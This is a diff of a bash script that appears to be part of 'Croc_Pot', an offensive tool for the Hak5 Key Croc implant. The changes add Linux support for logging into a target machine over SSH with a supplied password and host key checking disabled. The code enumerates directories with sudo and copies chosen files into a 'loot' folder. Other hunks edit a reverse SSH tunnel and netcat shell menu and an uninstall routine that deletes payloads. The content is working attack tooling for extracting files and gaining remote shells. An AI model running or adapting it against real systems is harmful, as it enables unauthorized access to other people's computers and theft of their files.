+	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2> /dev/null
+	read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local r_f=${r_a}
+	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {Get-ChildItem -Path '${r_f}' | Select-Object FullName}"'
 	read_all ENTER THE FULL PATH OF FILE TO RECEIVE
 	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'test -e '${r_a}''
 	if [ $? -eq 0 ]; then
@@ -6926,6 +7261,18 @@ target_keycroc() {
 	else
 		echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
 	fi
+elif [ "$(OS_CHECK)" = LINUX ]; then
+	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo -ne "'${yellow}'Directory: '${clear}''${cyan}'${i} '${clear}''${yellow}'Contains: '${clear}''${green}'${g} '${clear}''${yellow}'files.'${clear}'\n"; done 2> /dev/null'
+	read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local r_f=${r_a}
+	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'f=`sudo find /'${r_f}' -type f -name "*.*"` ; echo -ne "'${green}'${f}'${clear}'\n"'
+	read_all ENTER THE FULL PATH OF FILE TO RECEIVE
+	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'test -e '${r_a}''
+	if [ $? -eq 0 ]; then
+		sshpass -p $(target_pw) scp ${TARGET_USERNAME}@$(os_ip):${r_a} /root/udisk/loot/Croc_Pot
+	else
+		echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
+	fi
+fi
 }
 ##
 #----SSH send Remote File by enter target credentials host_name/host_ip
@@ -6941,15 +7288,15 @@ ping -q -c 1 -w 1 ${r_h} &>/dev/null 2>&1
 	if [[ $? -ne 0 ]]; then
 		echo -ne "${red}Unable to reach host${clear}\n"
 	elif [[ "${#args[@]}" -eq 0 ]]; then
-		cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo "Directory $i contains $g files."; done
-		read_all ENTER THE FOLDER NAME TO VEIW FILES ; local r_f=${r_a}
-		find /${r_f} -type f -name "*.*"
+		cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
+		read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local r_f=${r_a}
+		f=`find /${r_f} -type f -name "*.*"` ; echo -ne "${green}${f}${clear}\n"
 		read_all ENTER THE FULL PATH OF FILE TO SEND ; local c_f=${r_a}
 		if [ -e "${c_f}" ]; then
 			read_all ENTER REMOTE HOST_NAME ; local r_n=${r_a}
 			scp -o "StrictHostKeyChecking no" ${c_f} ${r_n}@${r_h}:~/
 		else
-		echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
+			echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
 		fi
 	fi
 else
@@ -6972,16 +7319,16 @@ ping -q -c 1 -w 1 ${r_h} &>/dev/null 2>&1
 		echo -ne "${red}Unable to reach host${clear}\n"
 	elif [[ "${#args[@]}" -eq 0 ]]; then
 		read_all ENTER REMOTE HOST_NAME ; local r_n=${r_a}
-		ssh -o "StrictHostKeyChecking no" ${r_n}@${r_h} 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo "Directory $i contains $g files."; done'
-		read_all ENTER THE FOLDER NAME TO VEIW FILES ; local r_f=${r_a}
-		ssh ${r_n}@${r_h} 'find /'${r_f}' -type f -name "*.*"'
+		ssh -o "StrictHostKeyChecking no" ${r_n}@${r_h} 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo -ne "'${yellow}'Directory: '${clear}''${cyan}'${i} '${clear}''${yellow}'Contains: '${clear}''${green}'${g} '${clear}''${yellow}'files.'${clear}'\n"; done 2> /dev/null'
+		read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local r_f=${r_a}
+		ssh ${r_n}@${r_h} 'f=`sudo find /'${r_f}' -type f -name "*.*"` ; echo -ne "'${green}'${f}'${clear}'\n"'
 		read_all ENTER THE FULL PATH OF FILE TO RECEIVE
 		ssh ${r_n}@${r_h} 'test -e '${r_a}''
-			if [ $? -eq 0 ]; then
-				scp ${r_n}@${r_h}:${r_a} /root/udisk/loot/Croc_Pot
-			else
-				echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
-			fi
+		if [ $? -eq 0 ]; then
+			scp ${r_n}@${r_h}:${r_a} /root/udisk/loot/Croc_Pot
+		else
+			echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
+		fi
 	fi
 else
 	echo -ne "${red}Not a valid ip address${clear}\n" ; invalid_entry
@@ -7044,11 +7391,11 @@ command_menu
 ##
 #----SSH croc reverse shell Menu
 ##
-MenuTitle REVERSE SSH TUNNEL MENU ; MenuColor 24 1 REVERSE TUNNEL NETCAT ; MenuColor 24 2 CROC LISTENING ; MenuColor 24 3 REVERSE TUNNEL PAYLOAD ; MenuColor 24 4 REVERSE TUNNEL TARGET PC ; MenuColor 24 5 REVERSE TUNNEL VPS
-MenuColor 24 6 REMOTE COMMANDS TARGETS ; MenuColor 24 7 SEND FILE WITH SCP ; MenuColor 24 8 RETURN TO MAIN MENU ; MenuEnd 27
+MenuTitle REVERSE SSH TUNNEL MENU ; MenuColor 24 1 REVERSE TUNNEL NETCAT ; MenuColor 24 2 CROC LISTENING ; MenuColor 24 3 REVERSE TUNNEL TARGET PC ; MenuColor 24 4 REVERSE SSH TUNNEL VPS
+MenuColor 24 5 REMOTE COMMANDS TARGETS ; MenuColor 24 6 SEND FILE WITH SCP ; MenuColor 24 7 RETURN TO MAIN MENU ; MenuEnd 27
 	case $m_a in
-	1) remote_listener ; croc_reverse_shell ;; 2) croc_listener ; croc_reverse_shell ;; 3) reverse_payload ; croc_reverse_shell ;; 4) shell_pc ; croc_reverse_shell ;; 5) ssh_tunnel ; croc_reverse_shell ;;
-	6) remote_command ;; 7) remote_file ;; 8) main_menu ;; 0) exit 0 ;; [bB]) ssh_menu ;; *) invalid_entry ; croc_reverse_shell ;;
+	1) remote_listener ; croc_reverse_shell ;; 2) croc_listener ; croc_reverse_shell ;; 3) shell_pc ; croc_reverse_shell ;; 4) ssh_tunnel ; croc_reverse_shell ;;
+	5) remote_command ;; 6) remote_file ;; 7) main_menu ;; 0) exit 0 ;; [bB]) ssh_menu ;; *) invalid_entry ; croc_reverse_shell ;;
 	esac
 }
 ##
@@ -7079,7 +7426,7 @@ MenuTitle CROC POT SSH MENU
 echo -ne "\t\t" ; MenuColor 18 1 SSH TARGET PC | tr -d '\t\n' ; MenuColor 20 8 SIGNAL OWL | tr -d '\t'
 echo -ne "\t\t" ; MenuColor 18 2 SSH USER INPUT | tr -d '\t\n' ; MenuColor 20 9 SHARK JACK | tr -d '\t'
 echo -ne "\t\t" ; MenuColor 18 3 ENABLE_SSH | tr -d '\t\n' ; MenuColor 19 10 BASH BUNNY | tr -d '\t'
-echo -ne "\t\t" ; MenuColor 18 4 DISABLE_SSH | tr -d '\t\n' ; MenuColor 19 11 REVERSE SHELL | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 4 DISABLE_SSH | tr -d '\t\n' ; MenuColor 19 11 REVERSE SHELL MENU | tr -d '\t'
 echo -ne "\t\t" ; MenuColor 18 5 WIFI PINEAPPLE MK7 | tr -d '\t\n' ; MenuColor 19 12 PUBLIC/PRIVATE KEY | tr -d '\t'
 echo -ne "\t\t" ; MenuColor 18 6 PACKET SQUIRREL | tr -d '\t\n' ; MenuColor 19 13 REMOVE SSH_KEYGEN | tr -d '\t'
 echo -ne "\t\t" ; MenuColor 18 7 LAN TURTLE | tr -d '\t\n' ; MenuColor 18 14 RETURN TO MAIN MENU | tr -d '\t'
@@ -7185,13 +7532,13 @@ remove_croc_pot() {
 	echo -ne "$(ColorRed 'ARE YOU SURE TO REMOVE CROC_POT TYPE YES OR NO AND PRESS [ENTER]:')"; read -p $(echo -ne "\e[30;42m") CROC_POT_REMOVE && echo -ne "${clear}"
 case $CROC_POT_REMOVE in
 [yY] | [yY][eE][sS])
-	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli host hping3 stunnel ike-scan
-	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot
+	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli host hping3 stunnel ike-scan wamerican-huge
+	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot /root/udisk/payloads/Croc_Lockout.txt
 	rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Getonline_Linux.txt
 	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt /root/udisk/payloads/Croc_Bite.txt.txt
 	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt /root/udisk/payloads/No_Sleeping.txt
 	rm /root/udisk/payloads/Getonline_Raspberry.txt /root/udisk/payloads/Quick_Start_C2.txt /root/udisk/payloads/Croc_replace.txt
-	rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt
+	rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt /root/udisk/payloads/Croc_Force_payload.txt
 	rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
 	rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt
 	apt-get autoremove
